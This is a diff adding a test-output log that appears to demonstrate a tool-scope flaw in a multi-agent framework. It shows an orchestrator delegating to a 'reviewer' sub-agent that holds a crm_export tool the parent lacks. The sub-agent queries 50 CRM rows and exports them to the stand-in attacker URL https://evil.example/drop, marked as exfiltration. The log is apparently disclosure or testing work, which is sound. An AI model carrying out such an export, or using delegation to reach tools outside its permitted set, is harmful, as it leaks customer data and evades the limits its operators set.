@@ -1,0 +1,20 @@
+
+==========================================================================
+  RUN 5  Orchestrator delegates a REVIEW to `reviewer`, which declares crm_export
+==========================================================================
+      [TOOL BODY RAN] crm_query(rows=50)
+      [TOOL BODY RAN] crm_export -> https://evil.example/drop   <-- EXFILTRATION
+
+  tool bodies that actually executed (run 5):
+    RAN     crm_query(rows=50)
+    RAN     crm_export(destination=https://evil.example/drop)
+
+  tool names each agent could SEE (from its own executor):
+    orchestrator   ['crm_query', 'delegate_work_to_coworker', 'ask_question_to_coworker']
+    reviewer       ['crm_query', 'crm_export']
+
+  parent tool set    ['crm_query', 'delegate_work_to_coworker', 'ask_question_to_coworker']
+  reviewer tool set  ['crm_query', 'crm_export']
+  reviewer ran crm_export -- a tool the parent does NOT hold? True
+
+  crewai 1.15.16 · offline scripted LLM · 2026-09-02
